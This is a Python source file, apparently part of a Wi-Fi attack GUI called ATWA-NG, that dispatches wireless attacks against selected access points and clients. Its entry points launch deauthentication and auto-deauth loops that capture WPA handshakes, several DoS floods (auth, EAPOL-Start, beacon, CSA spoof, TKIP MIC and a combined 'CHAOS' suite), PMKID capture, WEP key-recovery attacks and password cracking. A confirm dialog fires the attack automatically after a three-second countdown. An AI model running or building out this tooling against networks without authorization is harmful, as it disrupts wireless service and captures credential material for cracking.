"""Attack dispatch: monitor and scan control, the deauth/auto-deauth
flows, and every attack entry point.
"""

from __future__ import annotations

import threading
import time
import tkinter as tk
from tkinter import messagebox, ttk
from typing import TYPE_CHECKING

from ..scan import AccessPoint
from .state import GuiState

if TYPE_CHECKING:
    from .attack_runner import AttackRunner


class AttacksMixin(GuiState):

    def _runner(self) -> AttackRunner:
        """Build an AttackRunner from current App state."""
        from .attack_runner import AttackRunner

        return AttackRunner(
            mon_iface=self.mon_iface,
            own_mac=self.own_mac,
            capture_dir=self.capture_dir_var.get(),
            wordlist=self.wordlist_var.get() or None,
            stop_event=self._stop_event,
            progress_fn=self._progress_fn,
            log_fn=self._log,
            watch_capture_fn=self._watch_capture_size,
            crack_proc_holder=self._crack_proc_holder,
            iface_ap=self.iface_ap_var.get().strip() or None,
        )


    def _run_bg(self, label: str, fn, *args, result_kind: str | None = None,
                is_attack: bool = True, **kwargs):
        """Run a background task and report its lifecycle to the GUI.

        ``result_kind`` is for tasks whose result is a Tk-side operation (for
        example opening the Inspect All result dialog).  Its result is queued
        *after* the busy state is cleared, so a modal result window cannot
        leave the GUI looking busy forever.
        """
        if self._busy:
            messagebox.showwarning("ATWA-NG", "Another background operation is already running.")
            return
        # A prior attack's "Stop Attack" leaves this set; without clearing
        # it here, every later attack that reads self._stop_event (Caffe
        # Latte, Chopchop, rogue-AP workflows, Handshake Capture) would see itself
        # as already-stopped and abort instantly.
        self._stop_event.clear()
        self._queue.put(("busy", True))
        self._queue.put(("status", f"Running: {label}"))
        self._log(f">>> {label}")
        # Cheap, high-value sanity check: an attack that silently no-ops
        # because mon_iface slipped out of monitor mode (a stuck driver
        # state, a stray NetworkManager reclaim, etc.) looks identical in
        # the log to "the attack ran and found nothing" without this —
        # the single most confusing failure mode to diagnose blind.
        # Skipped for "Start monitor mode" itself -- that's the one action
        # whose entire job is to fix a not-yet-monitor-mode adapter, so
        # this check used to fire a backwards "needs monitor mode" warning
        # on the very call that establishes it (confirmed live, 2026-08-28).
        if is_attack and self.mon_iface and "demo" not in self.mon_iface and label != "Start monitor mode":
            try:
                from ..radio import get_mode

                mode = get_mode(self.mon_iface)
                if mode != "monitor":
                    self._log(f"    WARNING: {self.mon_iface} needs to be in monitor mode but is currently in '{mode}' mode — {label} will likely fail silently")
                else:
                    self._log(f"    {self.mon_iface}: monitor mode confirmed")
            except Exception as exc:  # noqa: BLE001 - GUI must survive adapter-query errors
                self._log(f"    could not check {self.mon_iface} mode: {exc}")

        done = threading.Event()
        _last_progress: list[str] = []

        def progress_fn(msg: str) -> None:
            """Attack functions call this to emit mid-run status lines."""
            _last_progress.clear()
            _last_progress.append(msg)
            self._log(f"    {msg}")

        # Expose progress_fn to work functions via a thread-local attribute
        # so they can capture it without changing _run_bg's signature.
        self._progress_fn = progress_fn

        def heartbeat():
            elapsed = 0
            while not done.wait(10):
                elapsed += 10
                last = _last_progress[0] if _last_progress else None
                if last:
                    self._log(f"    [{elapsed}s] {last}")
                else:
                    self._log(f"    ... {label} still running ({elapsed}s)")

        threading.Thread(target=heartbeat, daemon=True).start()

        def worker():
            result_delivered = False
            try:
                result = fn(*args, **kwargs)
                self._log(f"<<< {label} done: {result if result is not None else 'ok'}")
                if result_kind is not None:
                    # Clear busy before a modal result handler runs.  The
                    # drain loop cannot process queued busy=False while that
                    # handler blocks on wait_window().
                    self._queue.put(("busy", False))
                    self._queue.put(("status", "Ready."))
                    self._queue.put(("task_result", (result_kind, result)))
                    result_delivered = True
            except Exception as exc:  # noqa: BLE001 — surface every failure to the log/dialog
                self._log(f"!!! {label} failed: {exc}")
                self._queue.put(("error", f"{label} failed:\n{exc}"))
            finally:
                done.set()
                if not result_delivered:
                    self._queue.put(("busy", False))
                    self._queue.put(("status", "Ready."))

        threading.Thread(target=worker, daemon=True).start()


    def _run_capture_task(self, label: str, fn, *args, result_kind: str | None = None, **kwargs):
        """Run a Captures-tab operation without attack/monitor semantics."""
        self._run_bg(label, fn, *args, result_kind=result_kind, is_attack=False, **kwargs)

    # ------------------------------------------------------------------
    # Adapters / monitor mode
    # ------------------------------------------------------------------

    def _start_monitor(self):
        iface = self.adapter_var.get()
        if not iface:
            messagebox.showwarning("ATWA-NG", "Select an adapter first.")
            return
        # Read here, on the Tk thread: a cross-thread .get() is the same
        # undefined Tcl call a cross-thread .set() is (the rule stated at
        # the queue.put below applies to reads too).
        randomize_mac = self.randomize_mac_var.get()

        def work():
            from ..radio import get_mac, set_monitor_mode

            mon, permanent_mac = set_monitor_mode(iface, randomize_mac=randomize_mac)
            mac = get_mac(mon)
            self.mon_iface = mon
            self.own_mac = mac
            self._permanent_mac = permanent_mac
            self._queue.put(("status", f"Monitor mode on {mon}"))
            # Tk vars are NOT thread-safe -- set them on the Tk thread
            # via the queue, not directly from this worker.
            self._queue.put(("ui", lambda: self.mac_var.set(mac + (" (randomized)" if permanent_mac else ""))))
            self._queue.put(("ui", lambda: self.monitor_status_var.set(f"MONITOR: {mon}")))
            return mon

        self._run_bg("Start monitor mode", work)


    def _stop_monitor(self):
        if not self.mon_iface:
            return
        iface = self.mon_iface
        permanent_mac = self._permanent_mac

        def work():
            from ..radio import restart_network_manager, set_managed_mode

            set_managed_mode(iface, restore_mac=permanent_mac)
            self.mon_iface = None
            self._permanent_mac = None
            # NetworkManager drops a device that went to monitor mode and
            # won't re-adopt it on its own once the mode is back, so the
            # adapter would sit there unassociated after Stop Monitor.
            if restart_network_manager(iface):
                self._queue.put(("log", f"restarted NetworkManager so {iface} reconnects"))
            self._queue.put(("ui", lambda: self.monitor_status_var.set("MONITOR: OFF")))
            return iface

        self._run_bg("Stop monitor mode", work)

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------
    def _start_scan(self):
        if not self.mon_iface:
            messagebox.showwarning("ATWA-NG", "Start monitor mode first.")
            return
        if self._scanning.is_set():
            return
        self._scanning.set()
        self._scan_generation += 1
        generation = self._scan_generation
        self._log("scanning started")

        def loop():

            from ..frames.dissect import dissect
            from ..radio import ALL_CHANNELS, ChannelHopper, check_and_heal
            from ..scan import RawFrameSniffer, ScanResult, process_packet

            # One persistent hopper for the whole scanning session, not a
            # fresh one per pass — matches how the compiled scan engine actually works
            # (confirmed via --help: one continuous hop loop, incremental
            # display, never restarts). The old design called scan() in a
            # loop, which builds a brand-new ChannelHopper every time — its
            # channel index always restarted at 0, so with hop() costing a
            # full dwell itself (0.3s) *plus* the 0.3s sniff (0.6s/channel,
            # 13.2s for a full 22-channel sweep), a short bounded duration
            # never reached 5GHz at all, not just less often. process_packet
            # already merges correctly into a persistent ScanResult (fixed
            # 2026-08-19), so this also drops the GUI's own duplicate merge
            # logic that used to sit here.
            result = ScanResult(aps=self.aps)
            hopper = ChannelHopper(iface=self.mon_iface, channels=self._scan_channels or list(ALL_CHANNELS))

            def on_packet(raw):
                frame = dissect(raw)
                bssid = frame.addr3 if frame else None
                had_ssid = result.aps[bssid].ssid if bssid in result.aps else None
                process_packet(raw, result, own_mac=self.own_mac, frame=frame)
                if bssid and bssid in result.aps and not had_ssid and result.aps[bssid].ssid:
                    self._log(f"revealed hidden SSID: {result.aps[bssid].ssid} ({bssid})")

            def start_sniffer():
                s = RawFrameSniffer(iface=self.mon_iface, prn=on_packet)
                s.start()
                return s

            # ONE persistent capture socket for the whole scanning session,
            # not a fresh sniff() opened and closed every single hop -- the
            # exact same bug scan.py's own scan() function already fixed
            # (per-hop sniff() flaps promiscuous mode in lockstep with the
            # dwell timer on some drivers, confirmed live via dmesg, eating
            # into the listening window every hop and occasionally raising
            # a real ENETDOWN from the socket churn), just never ported into
            # the GUI's own loop until now. hopper.hop() already sleeps for
            # the dwell period itself, so this also drops the old code's
            # redundant *second* dwell-length wait from the per-hop
            # sniff(timeout=hopper.dwell) call -- a full channel sweep now
            # takes roughly half as long as before.
            try:
                sniffer = start_sniffer()
            except Exception as exc:  # noqa: BLE001 - transient driver errors must not kill the scan loop
                self._log(f"scan capture failed to start, retrying: {exc}")
                sniffer = None

            # Periodic self-healing check (2026-09-04, roadmap item):
            # NetworkManager reasserting control, a driver reset, or
            # anything else knocking mon_iface back to managed mid-session
            # doesn't always kill the sniffer thread -- a raw AF_PACKET
            # socket can sit there "alive" on a managed-mode interface
            # receiving nothing useful, silently, with no exception and no
            # crash to trigger the dead-sniffer restart below. Checked on a
            # timer rather than every hop to avoid an `iw` subprocess call
            # every 0.3s dwell.
            last_health_check = 0.0
            HEALTH_CHECK_INTERVAL = 10.0

            try:
                while self._scanning.is_set() and generation == self._scan_generation:
                    if self.mon_iface is None:
                        # Stop Monitor was pressed during the scan: the old
                        # sniffer dies with the interface and start_sniffer()
                        # would reopen RawFrameSniffer(iface=None) -- scapy's
                        # L2listen then silently opens its DEFAULT interface
                        # (or fails into a 0.5s retry loop), leaving the GUI
                        # "scanning" while none of this target's frames are
                        # being seen.
                        self._log("scan stopped: monitor mode was turned off")
                        break
                    now = time.monotonic()
                    if now - last_health_check >= HEALTH_CHECK_INTERVAL:
                        last_health_check = now
                        # check_and_heal() has no exception handling of its own --
                        # every call inside it (get_mode/get_channel/set_channel)
                        # raises RadioError straight through on any iw/ip failure.
                        # This whole loop body sits in a try/finally with no
                        # except, so an unguarded call here (a transient USB
                        # hiccup, the adapter being briefly busy, ...) used to
                        # propagate out of loop() entirely and silently kill
                        # self._scan_thread -- self._scanning never gets cleared
                        # since only Stop Scan does that, so the GUI kept showing
                        # "scanning" while nothing was actually happening anymore
                        # (2026-09-12 user report: "the scan eventually just
                        # stops"). Caught and logged here instead, same
                        # self-heal-don't-crash treatment this loop already gives
                        # every other failure mode (dead sniffer, failed restart).
                        try:
                            healed = check_and_heal(self.mon_iface)
                        except Exception as exc:  # noqa: BLE001
                            self._log(f"health check failed, will retry next cycle: {exc}")
                            healed = []
                        for action in healed:
                            self._log(action)
                        if healed and sniffer is not None:
                            # Healing cycles the interface down/up -- the
                            # existing capture socket is no longer valid.
                            try:
                                sniffer.stop()
                            except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
                                pass
                            sniffer = None
                    if sniffer is None or not sniffer.thread or not sniffer.thread.is_alive():
                        # The socket died underneath us (e.g. the transient
                        # "[Errno 100] Network is down" seen on some drivers
                        # during a fast band switch) -- restart it rather
                        # than silently scanning with no capture at all.
                        # AsyncSniffer._run_catch swallows every exception
                        # from inside the sniffing thread into .exception and
                        # lets the thread exit "cleanly" -- without reading
                        # it here, a dead-on-arrival socket (bad iface state,
                        # permission error, BPF filter rejected because the
                        # iface isn't actually in monitor mode, ...) restarts
                        # forever with zero indication of why.
                        if sniffer is not None and sniffer.exception is not None:
                            self._log(f"scan capture socket died: {sniffer.exception}")
                        try:
                            for action in check_and_heal(self.mon_iface):
                                self._log(action)
                        except Exception as exc:  # noqa: BLE001 -- see the other check_and_heal() call above for why this must not propagate
                            self._log(f"health check failed, will retry next cycle: {exc}")
                        try:
                            sniffer = start_sniffer()
                            self._log("scan capture socket (re)started")
                        except Exception as exc:  # noqa: BLE001
                            self._log(f"scan capture restart failed, retrying: {exc}")
                            sniffer = None
                            time.sleep(0.5)
                            continue
                    # An attack (deauth/capture/PMKID/WPS/PINCER/auto-deauth)
                    # needs exclusive use of mon_iface's channel. Pause
                    # hopping while busy instead of fighting an attack over
                    # which channel the radio is parked on; the persistent
                    # sniffer keeps passively receiving on whatever channel
                    # is currently set either way, so scan data isn't lost.
                    if self._busy:
                        time.sleep(0.3)
                        continue
                    # Locked/unlocked can change mid-session (double-click a
                    # different target, hit Unlock) — pick that up each hop
                    # rather than only at loop start.
                    wanted = self._scan_channels or list(ALL_CHANNELS)
                    if hopper.channels != wanted:
                        hopper.channels = wanted
                    hopper.hop()
                    if self.locked_bssid and self.locked_bssid in result.aps:
                        self._lock_lost_since = None
                    # Signal graph follows whatever's SELECTED, not just locked
                    # (2026-08-26 live-test note: single-click a row should
                    # immediately start updating the graph, not just after a
                    # double-click lock — selected_bssid equals locked_bssid
                    # once you do lock, since selection fires with the click).
                    if self.selected_bssid and self.selected_bssid in result.aps:
                        # last_signal, not signal -- signal is a running best-ever
                        # max (by design, for the target list/sort column), which
                        # ratchets up once and then plateaus forever. Feeding that
                        # into a rolling time graph made it look permanently stuck
                        # after the first strong reading instead of tracking the
                        # actual live RSSI.
                        self._queue_signal_sample(result.aps[self.selected_bssid].last_signal)
                    self._queue_scan_update()
            finally:
                if sniffer is not None:
                    try:
                        sniffer.stop()
                    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
                        pass

        self._scan_thread = threading.Thread(target=loop, daemon=True)
        self._scan_thread.start()


    def _stop_scan(self):
        self._scanning.clear()
        self._scan_generation += 1  # invalidate any loop thread still mid-dwell
        self._log("scanning stopped")


    # ------------------------------------------------------------------
    # Attacks — every call below hits this project's own native implementation.
    # ------------------------------------------------------------------
    def _confirm_attack(self, title: str, detail: str) -> bool:
        """Modal countdown confirm before firing an attack. Attacks are
        native calls, not shell commands, so this shows a plain-English
        summary instead of a literal command line. Auto-confirms at 0
        unless Cancelled; Execute Now skips the wait. Blocks
        (wait_window) until a choice is made."""
        result = {"go": False}
        dlg = tk.Toplevel(self.root)
        dlg.title("Confirm Attack")
        dlg.configure(bg=self.THEME["bg"])
        dlg.transient(self.root)
        dlg.grab_set()
        dlg.resizable(False, False)

        ttk.Label(dlg, text=title, style="Heading.TLabel").pack(padx=16, pady=(14, 4))
        ttk.Label(dlg, text=detail, style="Muted.TLabel", justify=tk.LEFT, wraplength=380).pack(padx=16, pady=(0, 10))
        count_var = tk.StringVar(value="Executing in 3...")
        ttk.Label(dlg, textvariable=count_var, font=self.fonts["ui_bold"]).pack(pady=(0, 10))

        remaining = [3]
        after_id: list[str | None] = [None]

        def go():
            if after_id[0]:
                dlg.after_cancel(after_id[0])
            result["go"] = True
            dlg.destroy()

        def cancel():
            if after_id[0]:
                dlg.after_cancel(after_id[0])
            result["go"] = False
            dlg.destroy()

        def tick():
            remaining[0] -= 1
            if remaining[0] <= 0:
                go()
                return
            count_var.set(f"Executing in {remaining[0]}...")
            after_id[0] = dlg.after(1000, tick)

        btns = ttk.Frame(dlg)
        btns.pack(pady=(0, 14))
        ttk.Button(btns, text="Cancel", command=cancel, style="Danger.TButton").pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Execute Now", command=go, style="Accent.TButton").pack(side=tk.LEFT, padx=6)

        dlg.protocol("WM_DELETE_WINDOW", cancel)
        after_id[0] = dlg.after(1000, tick)
        dlg.wait_window()
        return result["go"]


    def _start_client_auto_deauth(self, client: str):
        ap = self._require_target()
        if not ap or client not in ap.clients:
            return
        if ap.pmf == "required":
            messagebox.showwarning(
                "ATWA-NG",
                "PMF is required on this target, so deauthentication would be dropped.",
            )
            return
        self.auto_deauth_var.set(True)
        self._start_auto_deauth(ap, client)


    def _start_auto_deauth(self, ap: AccessPoint, client: str | None = None):
        if self._busy or (self._auto_deauth_thread is not None and self._auto_deauth_thread.is_alive()):
            messagebox.showwarning("ATWA-NG", "Another attack is already running. Use Stop Attack first.")
            self.auto_deauth_var.set(False)
            return
        if ap.channel is None:
            # The run thread only knows this after it starts; validated HERE
            # so the operator gets a real message and the checkbox resets,
            # instead of a dead thread with the box still on and the log
            # claiming a start (dissect.channel_of documents live APs with
            # channel=None).
            messagebox.showwarning(
                "ATWA-NG",
                f"No channel known for {ap.bssid} yet — select the target again once a scan reports its channel.",
            )
            self.auto_deauth_var.set(False)
            return
        from ..attacks.logic import select_client

        target = select_client(ap, client)
        self._auto_deauth_stop = threading.Event()
        self._auto_deauth_client = None if target == "ff:ff:ff:ff:ff:ff" else target
        interval = int(self.deauth_interval_var.get())
        target_desc = self._auto_deauth_client or "broadcast"
        self._log(
            f"auto-deauth started for {target_desc} on {ap.bssid} "
            f"(every {interval}s, stops on CHALLENGE or AUTHORIZED capture)"
        )
        self._auto_deauth_thread = threading.Thread(
            target=self._auto_deauth_run,
            args=(ap, self._auto_deauth_client, interval, self._auto_deauth_stop),
            daemon=True,
        )
        self._auto_deauth_thread.start()


    def _toggle_auto_deauth(self):
        """Auto-deauth uses the selected client station, or the strongest
        observed client when no client row is selected. The AP BSSID remains
        the capture/filter identity; the station MAC is only the deauth
        destination."""
        if not self.auto_deauth_var.get():
            if hasattr(self, "_auto_deauth_stop"):
                self._auto_deauth_stop.set()
            self._log("auto-deauth stopped")
            return
        ap = self._require_target()
        if not ap:
            self.auto_deauth_var.set(False)
            return
        self._start_auto_deauth(ap, self._selected_client())


    def _auto_deauth_run(
        self,
        ap: AccessPoint,
        client: str | None,
        interval: int,
        stop_event: threading.Event,
    ):
        assert self.mon_iface is not None
        import time as _time

        from ..attacks.deauth import deauth
        from ..attacks.handshake import (
            HandshakeCapture,
            HandshakeStatus,
            capture_handshake,
        )
        from ..attacks.logic import best_status, run_deauth_flow, select_client
        from ..storage import target_capture_dir

        # busy FIRST, before anything that can fail: a missing channel (the
        # old assert), a PMF skip or target_capture_dir raising OSError all
        # used to die OUTSIDE the try, so neither busy=False nor
        # auto_deauth_done were ever queued -- checkbox stayed on, the log
        # already claimed a start, and no deauth ever fired.
        self._queue.put(("busy", True))
        listener: threading.Thread | None = None
        watch_stop: threading.Event | None = None
        try:
            if ap.channel is None:
                self._log(f"auto-deauth: no channel known for {ap.bssid} -- select the target again after a scan")
                return

            if ap.pmf == "required":
                self._log("auto-deauth: PMF required — deauth would be dropped, skipping round loop entirely")
                return

            max_rounds = 6
            out_dir = target_capture_dir(ap.ssid, ap.bssid)
            out_file = out_dir / f"autodeauth_{int(_time.time())}.pcap"
            cap = HandshakeCapture()

            def listen():
                capture_handshake(
                    self.mon_iface, ap.bssid, channel=ap.channel,
                    timeout=interval * max_rounds + 10, outfile=str(out_file),
                    stop_event=stop_event, progress_fn=self._log, cap=cap,
                )

            def safe_deauth(iface, bssid, client, count, channel, reason, progress_fn=None):
                # auto-deauth's loop must survive per-round errors (e.g. a
                # radio.RadioError from deauth()'s own ensure_monitor_mode()
                # call if the interface drops mid-run) -- run_deauth_flow
                # itself doesn't wrap deauth_fn, so this does.
                try:
                    return deauth(iface, bssid, client=client, count=count, channel=channel, reason=reason, progress_fn=progress_fn, stop_event=stop_event)
                except Exception as exc:  # noqa: BLE001
                    (progress_fn or self._log)(f"auto-deauth round failed: {exc}")
                    return 0

            # Marks mon_iface busy so the background scan loop (_start_scan)
            # stops opening its own competing sniff() socket on the same
            # interface for the duration of this run — this bypasses _run_bg
            # (toggle checkbox, not a one-shot attack), so it never set
            # self._busy before, letting the scan loop's per-hop socket churn
            # starve both the deauth TX and the handshake-capture RX.
            listener = threading.Thread(target=listen, daemon=True)
            listener.start()
            watch_stop = threading.Event()
            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()

            # The caller may have selected a client row. Keep the AP BSSID as
            # the capture/filter identity, but pass the selected station MAC
            # through as the directed deauth destination.
            client = select_client(ap, preferred=client)
            # burst_size=64 keeps auto-deauth's existing frame count -- see
            # attacks/logic.py; History.md, 2026-09-13.
            run_deauth_flow(
                safe_deauth, self.mon_iface, ap, client, cap,
                max_rounds=max_rounds, round_interval=interval, burst_size=64,
                min_status=HandshakeStatus.CHALLENGE,
                stop_event=stop_event, progress_fn=self._log,
            )

            # CHALLENGE-only success does NOT trip capture_handshake's
            # AUTHORIZED-only stop_filter, so the listener would otherwise
            # keep its raw socket + PcapWriter open for the rest of the
            # ~interval*rounds+10 window after join(timeout) gave up --
            # all while busy was already cleared and the scan loop (or the
            # next attack) was free to open a competing socket on this
            # same interface. This run is over; tell the listener now.
            stop_event.set()
            if listener is not None:
                listener.join(timeout=10)
            status = best_status(cap)
            if status is HandshakeStatus.AUTHORIZED:
                self._log(f"auto-deauth: AUTHORIZED handshake captured -> {out_file}")
            elif status is HandshakeStatus.CHALLENGE:
                self._log(f"auto-deauth: CHALLENGE handshake captured (unverified by AP) -> {out_file}")
            else:
                self._log("auto-deauth: stopped or exhausted rounds, no handshake material captured")
        finally:
            # Same stop/join on EVERY path -- including an exception
            # mid-flow, which previously skipped watch_stop.set() entirely
            # (leaked size-watcher) and left the listener running.
            stop_event.set()
            if listener is not None:
                listener.join(timeout=10)
            if watch_stop is not None:
                watch_stop.set()
            self._queue.put(("busy", False))
            self._queue.put(("auto_deauth_done", None))
            self._auto_deauth_client = None


    def _stop_attack(self):
        self._stop_event.set()
        self.auto_deauth_var.set(False)
        if hasattr(self, "_auto_deauth_stop"):
            self._auto_deauth_stop.set()
        self._auto_deauth_client = None
        crack_proc = self._crack_proc_holder.get("proc")
        if crack_proc is not None and crack_proc.poll() is None:
            self._log("stop requested: terminating the running crack process (John/aircrack-ng)")

            def escalate(proc=crack_proc):
                # SIGTERM alone isn't reliable -- a live test against
                # aircrack-ng showed it can catch SIGTERM, print "Quitting
                # aircrack-ng..." repeatedly, and never actually exit.
                # SIGKILL can't be caught, so escalate to it after a grace
                # period. And with john --fork=N, signaling only the leader
                # orphans the worker children -- terminate_tree() signals the
                # whole process group. Run off the Tk thread so the UI
                # doesn't block.
                from ..crack.john import terminate_tree

                terminate_tree(proc, grace=3.0)

            threading.Thread(target=escalate, daemon=True).start()
        self._log("stop requested — aborting the running attack (deauth bursts and online-guess "
                   "abort within a fraction of a second; OMNI/Smart/WPS loops exit at their next "
                   "round check; a crack subprocess is terminated above)")


    def _stop_cracking(self):
        """Dedicated Stop button for the Captures panel -- the generic
        'Stop Attack' button lives in the Attacks tab and isn't visible
        while cracking from here, which was the actual complaint (not that
        stopping didn't work). Same termination path as _stop_attack."""
        self._stop_attack()


    def _attack_deauth_all(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("Deauth All Clients", f"Send 64 deauth frames to ALL clients on {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        self._run_bg(f"Deauth all clients on {ap.bssid}", self._runner().deauth_all, ap)


    def _attack_deauth_client(self):
        ap = self._require_target()
        if not ap:
            return
        client = self._selected_client()
        if not client:
            messagebox.showwarning("ATWA-NG", "No client selected — pick one from the Clients list.")
            return
        if not self._confirm_attack("Deauth Client", f"Send 64 deauth frames to {client} on {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        self._run_bg(f"Deauth {client} on {ap.bssid}", self._runner().deauth_client, ap, client)

    # ------------------------------------------------------------------
    # DoS / protocol-disruption floods (v2.4)
    # ------------------------------------------------------------------


    def _attack_csa_spoof(self):
        ap = self._require_target()
        if not ap:
            return
        from tkinter import simpledialog

        new_channel = simpledialog.askinteger(
            "ATWA-NG", "CSA Spoof: channel to tell clients to switch to:",
            parent=self.root, minvalue=1, maxvalue=165,
        )
        if not new_channel:
            return
        client = self._selected_client()
        target_desc = client or "broadcast (all clients)"
        if not self._confirm_attack(
            "CSA Spoof",
            f"Send forged Channel Switch Announcement frames from {ap.bssid} telling "
            f"{target_desc} to switch to channel {new_channel}. Protocol-level redirect, "
            "not a disassociation — a client that honors it just silently retunes.",
        ):
            return
        self._run_bg(
            f"CSA spoof on {ap.bssid} -> ch{new_channel}",
            self._runner().csa_spoof, ap, new_channel, client,
        )


    def _attack_eapol_flood(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack(
            "EAPOL-Start Flood",
            f"Flood {ap.bssid} ({ap.ssid or '<hidden>'}) with 100 EAPOL-Start frames from "
            "randomized spoofed source MACs, attempting to exhaust its 802.1X session table.",
        ):
            return
        self._run_bg(f"EAPOL-Start flood on {ap.bssid}", self._runner().eapol_flood, ap, 100)


    def _attack_auth_flood(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack(
            "Auth Flood",
            f"Flood {ap.bssid} ({ap.ssid or '<hidden>'}) with 100 open-system authentication "
            "requests from randomized spoofed source MACs, attempting to exhaust its "
            "association table.",
        ):
            return
        self._run_bg(f"Auth flood on {ap.bssid}", self._runner().auth_flood, ap, 100)


    def _attack_beacon_flood(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack(
            "Beacon Flood",
            f"Broadcast 100 fake beacons (random BSSIDs/SSIDs) on channel "
            f"{ap.channel or '<current>'} — noise to confuse client auto-connect / Wi-Fi "
            f"scanners near {ap.bssid} ({ap.ssid or '<hidden>'}).",
        ):
            return
        self._run_bg(f"Beacon flood (channel {ap.channel})", self._runner().beacon_flood, ap.channel, 100)


    def _attack_tkip_mic_flood(self):
        ap = self._require_target()
        if not ap:
            return
        client = self._selected_client()
        target_desc = client or "broadcast"
        if not self._confirm_attack(
            "TKIP MIC Flood",
            f"Send 2 synthetic bad-MIC frames to {ap.bssid} ({target_desc}) attempting to "
            "trigger TKIP's Michael-MIC countermeasure (60s lockout + forced rekey).\n"
            "Best-effort against a real receiver — see attacks/tkip_mic_flood.py's module "
            "docstring for why this may not reliably trigger it; WPA2/WPA3-CCMP-only "
            "networks are unaffected either way (TKIP-specific attack).",
        ):
            return
        self._run_bg(f"TKIP MIC flood on {ap.bssid}", self._runner().tkip_mic_flood, ap, client)


    def _attack_chaos(self):
        ap = self._require_target()
        if not ap:
            return
        client = self._selected_client()
        target_desc = client or "broadcast (all clients)"
        if not self._confirm_attack(
            "CHAOS Flood",
            f"Run the full coordinated flood suite against {ap.bssid} "
            f"({ap.ssid or '<hidden>'}) targeting {target_desc}:\n"
            "six vectors (beacon, EAPOL, auth, deauth, CSA, TKIP-MIC) at three "
            "escalating tiers (100/1000/5000 frames), with a 2s settle between "
            "each vector so the effects don't contaminate each other.\n\n"
            "Multi-vector DoS; runs for about a minute or more. Reports which "
            "vectors actually transmitted and the effect expected of them "
            "(from lab measurement) -- not raw frame counts. "
            "Stop Attack aborts it between vectors.",
        ):
            return
        self._run_bg(f"CHAOS flood on {ap.bssid}", self._runner().chaos, ap, client)


    def _attack_pmkid(self):
        ap = self._require_target()
        if not ap:
            return
        if not self.own_mac:
            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
            return
        if not self._confirm_attack("PMKID Attack", f"Clientless PMKID capture against {ap.bssid} ({ap.ssid or '<hidden>'})."):
            return
        self._run_bg(f"PMKID attack on {ap.bssid}", self._runner().pmkid, ap)


    def _attack_handshake(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("Handshake Capture", f"Sniff EAPOL on {ap.bssid} ({ap.ssid or '<hidden>'}) for up to 60s."):
            return

        def work():
            result = self._runner().handshake(ap)
            # Prefix marker, NOT a substring scan of the whole result: the
            # result embeds the capture path, which contains the
            # user-controlled SSID -- "Authorized_Users" as an SSID used to
            # pop a success dialog for a CHALLENGE-only capture.
            if result.startswith("AUTHORIZED"):
                self._queue.put(("info", f"AUTHORIZED handshake captured for {ap.bssid} ({ap.ssid or '<hidden>'}).\n{result}"))
            return result

        self._run_bg(f"Handshake capture on {ap.bssid}", work)


    def _attack_smart(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("Smart Attack", f"Run full Smart Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
            return
        self._run_bg(f"Smart Attack on {ap.bssid}", self._runner().smart, ap)


    def _attack_omni(self):
        ap = self._require_target()
        if not ap:
            return
        if not self._confirm_attack("OMNI Attack", f"Run full OMNI Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
            return
        self._run_bg(f"OMNI Attack on {ap.bssid}", self._runner().omni, ap)


    def _attack_wep(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "WEP attack needs a known SSID (this AP's SSID hasn't been seen yet).")
            return
        if not self.own_mac:
            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
            return
        key_len = 13
        if not messagebox.askyesno("ATWA-NG", "WEP attack: use WEP-104 (13-byte key)? Choose No for WEP-40 (5-byte)."):
            key_len = 5
        if not self._confirm_attack("WEP Attack", f"Fake-auth + ARP replay + PTW key recovery against {ap.bssid} ({ap.ssid})."):
            return
        self._run_bg(f"WEP attack on {ap.bssid}", self._runner().wep, ap, key_len)


    def _attack_caffe_latte(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.clients:
            messagebox.showwarning("ATWA-NG", "Caffe Latte needs a visible client — lock a WEP AP with at least one client listed.")
            return
        client_mac = next(iter(ap.clients))
        key_len = 13 if messagebox.askyesno("ATWA-NG", "WEP Caffe Latte: use WEP-104 (13-byte)? No = WEP-40 (5-byte).") else 5
        if not self._confirm_attack(
            "WEP Caffe Latte",
            f"Client-only WEP attack against {client_mac} (client of {ap.bssid}).\n"
            "No AP association needed — replays client ARPs to collect IVs.",
        ):
            return
        self._run_bg(f"Caffe Latte on {client_mac}", self._runner().caffe_latte, client_mac, ap, key_len)


    def _attack_hirte(self):
        ap = self._require_target()
        if not ap or not ap.clients:
            messagebox.showwarning("ATWA-NG", "Hirte needs a visible client on an ad-hoc/IBSS WEP target.")
            return
        client_mac = next(iter(ap.clients))
        key_len = 13 if messagebox.askyesno("ATWA-NG", "WEP Hirte: use WEP-104 (13-byte)? No = WEP-40 (5-byte).") else 5
        if not self._confirm_attack(
            "WEP Hirte",
            f"IBSS/client-only WEP attack against {client_mac} (client of {ap.bssid}).\n"
            "Replays the captured client frame with IBSS DS flags and collects fresh IVs.",
        ):
            return
        self._run_bg(f"Hirte on {client_mac}", self._runner().hirte, client_mac, ap, key_len)


    def _attack_chopchop(self):
        """The native from-scratch chopchop (ICV-correction math) was
        confirmed broken by two independent offline verification tests and
        later deleted (2026-09-14) -- see the note above
        attacks/wep_client.py's chopchop_vendor(). This drives the
        project's own vendored/self-compiled aireplay-ng's real
        -4/--chopchop mode instead (chopchop_vendor(), wired via
        AttackRunner.chopchop())."""
        ap = self._require_target()
